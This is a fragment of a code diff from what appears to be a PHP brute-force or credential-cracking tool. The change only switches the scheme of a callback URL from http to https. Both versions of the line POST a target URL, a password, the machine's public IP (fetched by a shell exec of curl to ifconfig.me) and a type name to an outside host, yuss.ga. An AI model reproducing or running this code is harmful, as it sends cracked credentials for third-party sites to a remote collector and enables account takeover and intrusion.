@@ -66,7 +66,7 @@ function crotz($x)
                 {
                     if(!empty($key))
                     {
-                    curl_setopt($ch, CURLOPT_URL, "http://yuss.ga/bruteberingas.php");
+                    curl_setopt($ch, CURLOPT_URL, "https://yuss.ga/bruteberingas.php");
                     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                     curl_setopt($ch, CURLOPT_POST, 1);
                     curl_setopt($ch, CURLOPT_POSTFIELDS, "url=" . $x . "&pass=" . $key . "&ip=" . exec("curl -s ifconfig.me") . "&name=" . $type);
